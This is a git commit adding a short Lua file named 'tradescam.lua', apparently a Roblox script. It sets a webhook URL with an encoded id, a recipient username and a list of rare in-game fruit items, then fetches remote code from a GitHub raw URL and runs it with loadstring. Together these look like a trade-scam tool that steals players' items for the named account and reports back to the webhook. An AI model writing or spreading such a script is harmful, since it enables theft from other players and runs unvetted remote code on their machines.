cb9f3cd7917c76b5f70ea9cca350bef4407cd3cf
shahzaib11rt <shahzaib11rt@gmail.com>
2025-03-13 19:08:40 +0500

    Create tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dmtCdlNPLVk0NjVlY0Zaclg2UG1DZzpUSU5lTzhmbmU5Z1hwRlF0aEtUS254dWFaS3N6Nzd1cUNUTEpKRE82ZHJWR1l6Qnc3RUdqWlRaQ05iUXM4X21Bb1VjWFFrQWR0S0dPRGR0QmYtdEFnOERCY2g3ZXdSVWF1Zzl4MlB1MExkVk5TQjhRdUhmRnA2ZG9tZHZ6d1Y0TFlaMldNS29zb2RIUVhybmxrV3psM25wZG9YeGx4LXJIbGNpUGFSNHkyclU"
+Usernames = {"rip_boss11rt"}
+FruitsToHit = {"Quake-Quake", "Buddha-Buddha", "Portal-Portal", "T-Rex-T-Rex", "Dough-Dough", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
